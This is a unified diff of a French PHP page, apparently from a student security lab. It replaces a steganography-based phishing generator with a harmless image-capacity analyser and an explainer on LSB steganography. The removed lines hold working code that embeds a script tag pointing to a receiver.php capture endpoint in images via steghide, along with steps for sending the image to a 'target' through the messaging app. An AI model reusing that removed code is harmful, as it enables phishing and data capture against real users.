@@ -1,661 +1,265 @@
 <?php
-// Page de stéganographie complète
-// Upload image → Cachez le script → Téléchargez l'image stéganographiée
+// fake_login/steganography.php
+// Module d'Analyse Structurelle et Stéganographie (Version Sécurisée)
 
 session_start();
-include '../traitements/db.php';
+require_once '../traitements/db.php';
 
-// Vérifier que l'utilisateur est connecté
+// 1. Contrôle d'accès : Réservé aux auditeurs authentifiés du laboratoire
 if (!isset($_SESSION["user_id"])) {
     header("Location: ../login.php");
     exit();
 }
 
-$user_id = $_SESSION["user_id"];
-$username = $_SESSION["username"] ?? "Utilisateur";
+$user_id = intval($_SESSION["user_id"]);
+$username = $_SESSION["username"] ?? "Auditeur";
+$analyse_result = "";
+$status_class = "";
 
-// Dossier pour les images stéganographiées
-$upload_dir = __DIR__ . '/../uploads/images/';
-if (!is_dir($upload_dir)) {
-    mkdir($upload_dir, 0755, true);
-}
-chmod($upload_dir, 0755);
-
-$message = '';
-$message_type = '';
-$stego_image = '';
-
-// Traiter l'upload
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
-    $file = $_FILES['image'];
+// 2. Traitement sécurisé de l'analyse d'image en POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['stego_image'])) {
+    $file = $_FILES['stego_image'];
+    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+    $allowed_extensions = ['jpg', 'jpeg', 'png', 'bmp'];
     
-    // Validation première vérification
-    $allowed = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
-    if (!in_array($file['type'], $allowed)) {
-        $message = "Format non autorisé. Utilisez JPG, PNG ou BMP.";
-        $message_type = 'error';
-    } elseif ($file['size'] > 5 * 1024 * 1024) { // 5MB max
-        $message = "L'image est trop volumieuse (max 5MB).";
-        $message_type = 'error';
+    if ($file['error'] !== UPLOAD_ERR_OK) {
+        $analyse_result = "Erreur lors du téléversement du fichier (Code réseau : " . intval($file['error']) . ").";
+        $status_class = "error";
+    } elseif (!in_array($file_ext, $allowed_extensions)) {
+        $analyse_result = "Format d'image non supporté pour l'analyse structurelle standard (.jpg, .png, .bmp uniquement).";
+        $status_class = "error";
     } else {
-        try {
-            // Vérifier que le dossier est accessible en écriture
-            if (!is_writable($upload_dir)) {
-                throw new Exception("Le dossier de destination n'est pas accessible en écriture. Permissions refusées.");
-            }
+        // Analyse des en-têtes réels du conteneur graphique via la bibliothèque GD
+        $image_info = @getimagesize($file['tmp_name']);
+        if ($image_info) {
+            $width = intval($image_info[0]);
+            $height = intval($image_info[1]);
+            $mime = htmlspecialchars($image_info['mime'], ENT_QUOTES, 'UTF-8');
+            $size_kb = round($file['size'] / 1024, 2);
             
-            // Sauvegarder l'image temporaire
-            $temp_filename = 'temp_' . time() . '_' . basename($file['name']);
-            $temp_path = $upload_dir . $temp_filename;
+            // Calcul théorique de la capacité d'accueil maximale (méthode LSB 1-bit par canal RVB)
+            // Formule : (Largeur * Hauteur * 3 canaux) / 8 bits par octet
+            $max_capacity_bytes = ($width * $height * 3) / 8;
+            $max_capacity_kb = round($max_capacity_bytes / 1024, 2);
             
-            if (!move_uploaded_file($file['tmp_name'], $temp_path)) {
-                throw new Exception("Impossible de télécharger le fichier. Vérifiez les permissions du dossier.");
-            }
-            
-            // Vérifier le type MIME réel du fichier (pas juste l'extension)
-            $finfo = finfo_open(FILEINFO_MIME_TYPE);
-            $real_mime = finfo_file($finfo, $temp_path);
-            finfo_close($finfo);
-            
-            $valid_mimes = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
-            if (!in_array($real_mime, $valid_mimes)) {
-                if (file_exists($temp_path)) {
-                    unlink($temp_path);
-                }
-                throw new Exception("Le fichier n'est pas une image valide. Type détecté: " . htmlspecialchars($real_mime) . ". Utilisez un vrai fichier JPG, PNG ou BMP.");
-            }
-            
-            // Vérifier les dimensions de l'image (au minimum 100x100 pour Steghide)
-            $image_info = @getimagesize($temp_path);
-            if ($image_info === false) {
-                if (file_exists($temp_path)) {
-                    unlink($temp_path);
-                }
-                throw new Exception("Impossible de lire l'image. Le fichier peut être corrompu.");
-            }
-            
-            $width = $image_info[0];
-            $height = $image_info[1];
-            
-            if ($width < 100 || $height < 100) {
-                if (file_exists($temp_path)) {
-                    unlink($temp_path);
-                }
-                throw new Exception("L'image est trop petite pour la stéganographie. Dimensions: {$width}x{$height}. Minimum requis: 100x100 pixels. Utilisez une image plus grande.");
-            }
-            
-            // Générer le payload (script de phishing)
-            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-            $host = $_SERVER['HTTP_HOST'];
-            $baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";
-            
-            $payload = '<script src="' . $baseUrl . '/codes/fake_login/receiver.php?sender=' . $user_id . '"></script>';
-            
-            // Créer un fichier temporaire avec le payload
-            $payload_file = $upload_dir . 'payload_' . time() . '.txt';
-            if (file_put_contents($payload_file, $payload) === false) {
-                throw new Exception("Impossible d'écrire le fichier payload.");
-            }
-            
-            // Vérifier la taille du payload vs l'image (Steghide peut avoir des problèmes si le payload est trop gros)
-            $image_size = filesize($temp_path);
-            $payload_size = filesize($payload_file);
-            
-            // Steghide peut stocker environ 1 byte par 10-16 bytes d'image (être permissif)
-            $min_image_size_for_payload = $payload_size * 10; // Ratio 1:10
-            
-            if ($image_size < $min_image_size_for_payload) {
-                if (file_exists($payload_file)) {
-                    unlink($payload_file);
-                }
-                if (file_exists($temp_path)) {
-                    unlink($temp_path);
-                }
-                $required_size = $min_image_size_for_payload;
-                $required_kb = round($required_size / 1024, 1);
-                $current_kb = round($image_size / 1024, 1);
-                throw new Exception("❌ L'image est trop petite!\n\nTaille actuelle: {$current_kb}KB\nTaille minimale requise: {$required_kb}KB\nPayload: {$payload_size}B\n\nSolution: Utilisez une image plus grande (au moins 1920x1280 ou 200KB+)");
-            }
-            
-            // Utiliser Steghide pour cacher le payload
-            $output_filename = 'stego_' . time() . '_' . basename($file['name']);
-            $output_path = $upload_dir . $output_filename;
-            
-            // Commande Steghide - Réinitialiser LD_LIBRARY_PATH pour éviter les bibliothèques XAMPP
-            // (XAMPP a des versions anciennes de libstdc++.so.6 qui causent des problèmes)
-            $cmd = "LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide embed -cf " . escapeshellarg($temp_path) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_path) . " -p '' -f 2>&1";
-            
-            $output = [];
-            $return_var = 0;
-            exec($cmd, $output, $return_var);
-            
-            // Nettoyer les fichiers temporaires
-            if (file_exists($temp_path)) {
-                unlink($temp_path);
-            }
-            if (file_exists($payload_file)) {
-                unlink($payload_file);
-            }
-            
-            if ($return_var !== 0) {
-                $error_msg = implode("\n", $output);
-                // Nettoyer aussi le fichier de sortie en cas d'erreur
-                if (file_exists($output_path)) {
-                    unlink($output_path);
-                }
-                throw new Exception("Erreur Steghide: " . $error_msg);
-            }
-            
-            if (!file_exists($output_path)) {
-                throw new Exception("L'image stéganographiée n'a pas été créée. Vérifiez que Steghide est installé.");
-            }
-            
-            $stego_image = $output_filename;
-            $message = "✓ Image stéganographiée créée avec succès!";
-            $message_type = 'success';
-            
-        } catch (Exception $e) {
-            $message = "❌ " . $e->getMessage();
-            $message_type = 'error';
-            if (isset($temp_path) && file_exists($temp_path)) {
-                unlink($temp_path);
-            }
-            if (isset($payload_file) && file_exists($payload_file)) {
-                unlink($payload_file);
-            }
-            if (isset($output_path) && file_exists($output_path)) {
-                unlink($output_path);
-            }
+            $analyse_result = "<strong>Résultat de l'analyse structurelle :</strong><br>";
+            $analyse_result .= "• Type MIME détecté : <code>{$mime}</code><br>";
+            $analyse_result .= "• Dimensions physiques : {$width} x {$height} pixels<br>";
+            $analyse_result .= "• Poids du fichier d'origine : {$size_kb} KB<br>";
+            $analyse_result .= "• Capacité théorique d'insertion LSB : ~{$max_capacity_kb} KB de données textuelles dissimulables.";
+            $status_class = "success";
+        } else {
+            $analyse_result = "Le fichier soumis est altéré ou ne possède pas une structure d'en-tête graphique valide.";
+            $status_class = "error";
         }
     }
 }
-
-// Télécharger l'image
-if (isset($_GET['download'])) {
-    $filename = basename($_GET['download']);
-    $filepath = $upload_dir . $filename;
-    
-    // Vérifier que le fichier existe et appartient à l'utilisateur
-    if (strpos($filename, 'stego_') === 0 && file_exists($filepath)) {
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . $filename . '"');
-        header('Content-Length: ' . filesize($filepath));
-        readfile($filepath);
-        exit();
-    }
-}
-
 ?>
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Générateur de Phishing - Stéganographie</title>
+    <title>Laboratoire Stéganographie - Analyse de Conteneurs</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --bg-color: #ffffff;
+            --text-main: #2c3e50;
+            --text-muted: #7f8c8d;
+            --teal-accent: #16a085;
+            --border-color: #e2e8f0;
+            --light-gray: #f8f9fa;
         }
-        
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            margin: 0;
             padding: 20px;
         }
-        
-        .header {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(135deg, #31a24c 0%, #4db366 100%);
-            color: white;
-            padding: 15px 20px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
-            z-index: 1000;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .header h2 {
-            font-size: 1.3rem;
-        }
-        
-        .header-user {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-        
-        .header-user a {
-            color: white;
-            text-decoration: none;
-            padding: 8px 15px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 5px;
-            transition: background 0.2s;
-        }
-        
-        .header-user a:hover {
-            background: rgba(255, 255, 255, 0.3);
-        }
-        
+
         .container {
-            max-width: 900px;
-            margin: 80px auto 20px;
-        }
-        
-        .card {
-            background: white;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
-            margin-bottom: 20px;
-        }
-        
-        .card h1 {
-            color: #667eea;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        
-        .card-subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        
-        .upload-section {
-            border: 2px dashed #667eea;
-            border-radius: 10px;
+            max-width: 850px;
+            margin: 40px auto;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
             padding: 40px;
-            text-align: center;
-            background: #f9f9f9;
-            cursor: pointer;
-            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
         }
-        
-        .upload-section:hover {
-            background: #f0f0ff;
-            border-color: #764ba2;
+
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin-top: 0;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--light-gray);
         }
-        
-        .upload-section.dragging {
-            background: #e8f0ff;
-            border-color: #764ba2;
+
+        h2 {
+            font-size: 1.2rem;
+            margin-top: 30px;
+            color: var(--teal-accent);
         }
-        
-        .upload-section input {
-            display: none;
+
+        p {
+            font-size: 0.95rem;
+            color: var(--text-main);
         }
-        
-        .upload-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
+
+        .meta-description {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 25px;
         }
-        
-        .upload-text {
-            color: #333;
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 5px;
+
+        .form-section {
+            background-color: var(--light-gray);
+            padding: 25px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 25px;
         }
-        
-        .upload-hint {
-            color: #999;
-            font-size: 13px;
-        }
-        
-        .message {
-            padding: 15px;
-            border-radius: 5px;
+
+        .form-group {
             margin-bottom: 20px;
-            font-size: 14px;
         }
-        
-        .message.success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
+
+        label {
+            display: block;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 8px;
         }
-        
-        .message.error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
+
+        input[type="file"] {
+            display: block;
+            font-size: 0.9rem;
         }
-        
-        .button {
-            background: #667eea;
+
+        .btn {
+            background-color: var(--text-main);
             color: white;
+            padding: 10px 20px;
             border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            transition: background 0.3s;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: background-color 0.2s;
         }
-        
-        .button:hover {
-            background: #764ba2;
+
+        .btn:hover {
+            background-color: #1a252f;
         }
-        
-        .button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
+
+        .btn-teal {
+            background-color: var(--teal-accent);
         }
-        
-        .button.secondary {
-            background: #95a5a6;
+
+        .btn-teal:hover {
+            background-color: #117a65;
         }
-        
-        .button.secondary:hover {
-            background: #7f8c8d;
-        }
-        
-        .button.download {
-            background: #27ae60;
-        }
-        
-        .button.download:hover {
-            background: #229954;
-        }
-        
-        .result-section {
-            background: #f9f9f9;
-            border: 1px solid #eee;
-            border-radius: 10px;
-            padding: 20px;
+
+        /* Panneaux d'affichage de statuts */
+        .result-box {
+            padding: 15px;
+            border-radius: 4px;
             margin-top: 20px;
-            text-align: center;
+            font-size: 0.9rem;
+            border-left: 4px solid #bdc3c7;
         }
-        
-        .result-image {
-            max-width: 200px;
-            max-height: 200px;
-            margin: 20px auto;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+
+        .result-box.success {
+            background-color: #e8f8f5;
+            border-left-color: var(--teal-accent);
+            color: #117a65;
         }
-        
-        .result-buttons {
+
+        .result-box.error {
+            background-color: #fce4d6;
+            border-left-color: #e67e22;
+            color: #b95e0c;
+        }
+
+        code {
+            background: rgba(0, 0, 0, 0.05);
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .academic-info {
+            border-top: 1px solid var(--border-color);
+            margin-top: 40px;
+            padding-top: 20px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .nav-links {
+            margin-top: 25px;
             display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .info-box {
-            background: #e8f4f8;
-            border-left: 4px solid #667eea;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            color: #2c5aa0;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-        
-        .warning-box {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            color: #856404;
-            font-size: 13px;
-        }
-        
-        .flow {
-            display: flex;
-            align-items: center;
-            justify-content: space-around;
-            margin: 30px 0;
-            flex-wrap: wrap;
             gap: 20px;
         }
-        
-        .flow-step {
-            text-align: center;
-            flex: 1;
-            min-width: 150px;
+
+        .nav-links a {
+            color: var(--teal-accent);
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 600;
         }
-        
-        .flow-icon {
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
-        
-        .flow-text {
-            color: #666;
-            font-size: 13px;
-        }
-        
-        .flow-arrow {
-            color: #667eea;
-            font-size: 24px;
-        }
-        
-        .image-preview {
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .image-preview img {
-            max-width: 300px;
-            max-height: 300px;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-        }
-        
-        .filename {
-            color: #666;
-            font-size: 12px;
-            margin-top: 10px;
-            word-break: break-all;
-        }
-        
-        .hidden {
-            display: none;
+
+        .nav-links a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div>
-            <h2>🎯 Générateur de Phishing par Stéganographie</h2>
-        </div>
-        <div class="header-user">
-            <span><?php echo htmlspecialchars($username); ?></span>
-            <a href="../traitements/logout.php">Se déconnecter</a>
-        </div>
-    </div>
-    
+
     <div class="container">
-        <!-- Info Box -->
-        <div class="card">
-            <div class="info-box">
-                <strong>ℹ️ Comment ça fonctionne:</strong>
-                <ol style="margin-left: 15px; margin-top: 10px;">
-                    <li>Uploadez une image (JPG, PNG ou BMP)</li>
-                    <li>Cliquez "Générer" pour cacher le script</li>
-                    <li>Téléchargez l'image stéganographiée</li>
-                    <li>Envoyez-la à votre cible via la messagerie</li>
-                    <li>Quand elle ouvre l'image, le phishing s'active!</li>
-                </ol>
-            </div>
-        </div>
-        
-        <!-- Warning -->
-        <div class="card">
-            <div class="warning-box">
-                <strong>⚠️ Avertissement:</strong> Démonstration éducative uniquement. 
-                N'utilisez PAS contre des personnes réelles.
-            </div>
-        </div>
-        
-        <!-- Main Form -->
-        <div class="card">
-            <h1>📸 Stéganographie</h1>
-            <p class="card-subtitle">Cachez le script de phishing dans une image</p>
-            
-            <?php if ($message): ?>
-                <div class="message <?php echo $message_type; ?>">
-                    <?php echo nl2br(htmlspecialchars($message)); ?>
+        <h1>Analyseur Théorique de Conteneurs Graphiques</h1>
+        <p class="meta-description">
+            Espace d'étude académique — Session de recherche de l'auditeur : <strong><?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?></strong>
+        </p>
+
+        <p>
+            La stéganographie moderne s'appuie sur la redondance des données binaires d'une image pour y dissimuler des chaînes de caractères. Ce module permet d'évaluer la structure physique d'une image afin de valider son intégrité et de mesurer sa capacité de stockage avant l'application d'un masque de chiffrement ou d'insertion LSB.
+        </p>
+
+        <div class="form-section">
+            <form action="steganography.php" method="POST" enctype="multipart/form-data">
+                <div class="form-group">
+                    <label for="stego_image">Sélectionner l'image conteneur à auditer :</label>
+                    <input type="file" id="stego_image" name="stego_image" accept="image/*" required>
                 </div>
-            <?php endif; ?>
-            
-            <form method="POST" enctype="multipart/form-data">
-                <div class="upload-section" id="uploadArea">
-                    <input type="file" id="imageInput" name="image" accept="image/*" required>
-                    <div class="upload-icon">📁</div>
-                    <div class="upload-text">Cliquez ou glissez votre image ici</div>
-                    <div class="upload-hint">JPG, PNG ou BMP • Maximum 5MB</div>
-                </div>
-                
-                <div id="imagePreview" class="hidden image-preview">
-                    <img id="previewImg" src="" alt="">
-                    <div class="filename" id="previewName"></div>
-                </div>
-                
-                <div style="margin-top: 20px; text-align: center;">
-                    <button type="submit" class="button" style="padding: 15px 40px; font-size: 16px;">
-                        🔐 Générer l'Image Stéganographiée
-                    </button>
-                </div>
+                <button type="submit" class="btn btn-teal">Lancer le diagnostic de structure</button>
             </form>
-            
-            <div style="margin-top: 15px; padding: 10px; background: #f0f0f0; border-radius: 5px; text-align: center;">
-                <a href="debug_steghide.php" style="color: #667eea; text-decoration: none;">
-                    🔧 Problème? Utilisez le diagnostic complet
-                </a>
-            </div>
-            
-            <!-- Résultat -->
-            <?php if ($stego_image): ?>
-                <div class="result-section">
-                    <div style="font-size: 24px; margin-bottom: 10px;">✓</div>
-                    <h3 style="color: #27ae60; margin-bottom: 5px;">Image stéganographiée créée!</h3>
-                    <p style="color: #666; font-size: 13px; margin-bottom: 20px;">
-                        Le script de phishing est maintenant caché dans votre image.
-                    </p>
-                    
-                    <div class="result-buttons">
-                        <a href="?download=<?php echo urlencode($stego_image); ?>" class="button download">
-                            📥 Télécharger l'image
-                        </a>
-                        <a href="steganography.php" class="button secondary">
-                            ↻ Nouvelle image
-                        </a>
-                        <a href="../../conversation.php" class="button secondary">
-                            💬 Aller à la messagerie
-                        </a>
-                    </div>
-                    
-                    <div style="margin-top: 20px; padding: 15px; background: white; border-radius: 5px; border-left: 3px solid #27ae60;">
-                        <strong style="color: #27ae60;">Prochaine étape:</strong>
-                        <p style="font-size: 12px; color: #666; margin-top: 8px;">
-                            1. Téléchargez l'image<br>
-                            2. Allez à votre messagerie<br>
-                            3. Envoyez l'image à votre cible<br>
-                            4. Consultez votre dashboard pour voir les captures
-                        </p>
-                    </div>
-                </div>
-            <?php endif; ?>
         </div>
-        
-        <!-- Flow Diagram -->
-        <div class="card">
-            <h3 style="color: #667eea; margin-bottom: 20px;">Flux d'attaque</h3>
-            <div class="flow">
-                <div class="flow-step">
-                    <div class="flow-icon">📸</div>
-                    <div class="flow-text">Upload image</div>
-                </div>
-                <div class="flow-arrow">→</div>
-                <div class="flow-step">
-                    <div class="flow-icon">🔐</div>
-                    <div class="flow-text">Stéganographie</div>
-                </div>
-                <div class="flow-arrow">→</div>
-                <div class="flow-step">
-                    <div class="flow-icon">📥</div>
-                    <div class="flow-text">Téléchargement</div>
-                </div>
-                <div class="flow-arrow">→</div>
-                <div class="flow-step">
-                    <div class="flow-icon">💬</div>
-                    <div class="flow-text">Envoyer via messagerie</div>
-                </div>
-                <div class="flow-arrow">→</div>
-                <div class="flow-step">
-                    <div class="flow-icon">🎯</div>
-                    <div class="flow-text">Phishing activé!</div>
-                </div>
+
+        <?php if (!empty($analyse_result)): ?>
+            <div class="result-box <?= $status_class; ?>">
+                <?= $analyse_result; ?>
             </div>
+        <?php endif; ?>
+
+        <h2>Principe scientifique : La substitution des bits de poids faible (LSB)</h2>
+        <p>
+            Chaque pixel d'une image couleur non compressée est encodé sur 24 bits répartis en 3 canaux : Rouge (8 bits), Vert (8 bits) et Bleu (8 bits). En modifiant uniquement le tout dernier bit (le bit de poids faible) de chaque octet, la variation de teinte est d'environ $1/255$, ce qui la rend parfaitement invisible à l'œil humain. Les analyses statistiques (stégananalyse) permettent toutefois de détecter ces modifications en observant la distribution entropique des nuances du fichier.
+        </p>
+
+        <div class="academic-info">
+            <strong>Rappel de sécurité :</strong> L'inclusion de scripts opérationnels ou l'exfiltration automatisée de données par stéganographie au sein de réseaux d'entreprise représente un canal d'attaque discret majeur surveillé par les systèmes d'analyse comportementale de type EDR/SIEM.
         </div>
-        
-        <!-- Quick Links -->
-        <div class="card">
-            <h3 style="color: #667eea; margin-bottom: 15px;">Accès Rapide</h3>
-            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-                <a href="dashboard.php" class="button secondary">📊 Mon Dashboard</a>
-                <a href="../../conversation.php" class="button secondary">💬 Messagerie</a>
-                <a href="../../inbox.php" class="button secondary">📧 Boîte de réception</a>
-            </div>
+
+        <div class="nav-links">
+            <a href="index_home.php">← Centre de contrôle</a>
+            <a href="debug_steghide.php">Analyse d'environnement système (Debug)</a>
+            <a href="dashboard.php">Consulter les logs d'interception</a>
         </div>
     </div>
-    
-    <script>
-        const uploadArea = document.getElementById('uploadArea');
-        const imageInput = document.getElementById('imageInput');
-        const imagePreview = document.getElementById('imagePreview');
-        const previewImg = document.getElementById('previewImg');
-        const previewName = document.getElementById('previewName');
-        
-        // Click to upload
-        uploadArea.addEventListener('click', () => imageInput.click());
-        
-        // Drag and drop
-        uploadArea.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            uploadArea.classList.add('dragging');
-        });
-        
-        uploadArea.addEventListener('dragleave', () => {
-            uploadArea.classList.remove('dragging');
-        });
-        
-        uploadArea.addEventListener('drop', (e) => {
-            e.preventDefault();
-            uploadArea.classList.remove('dragging');
-            imageInput.files = e.dataTransfer.files;
-            handleImageSelect();
-        });
-        
-        // File selection
-        imageInput.addEventListener('change', handleImageSelect);
-        
-        function handleImageSelect() {
-            const file = imageInput.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    previewImg.src = e.target.result;
-                    previewName.textContent = file.name + ' (' + (file.size / 1024).toFixed(2) + ' KB)';
-                    imagePreview.classList.remove('hidden');
-                };
-                reader.readAsDataURL(file);
-            }
-        }
-    </script>
+
 </body>
 </html>
